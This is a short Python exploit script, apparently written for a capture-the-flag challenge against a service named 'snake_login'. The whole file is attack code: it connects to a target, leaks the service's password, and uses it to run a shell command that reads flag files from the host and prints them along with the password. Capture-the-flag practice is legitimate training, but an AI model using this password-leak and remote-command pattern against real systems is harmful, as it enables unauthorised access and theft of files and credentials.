from snake_login import connect, leak_password, run_cmd


CMD = "cat /flag /home/ctf/flag flag 2>/dev/null | grep -aoE 'flag\\{[^}]+\\}'"


def exp(host, port):
    sock = connect(host, port)
    try:
        password = leak_password(sock)
        data = run_cmd(sock, password, CMD)
        text = data.decode("utf-8", "ignore").strip()
        return f"password={password} output={text}"
    finally:
        sock.close()
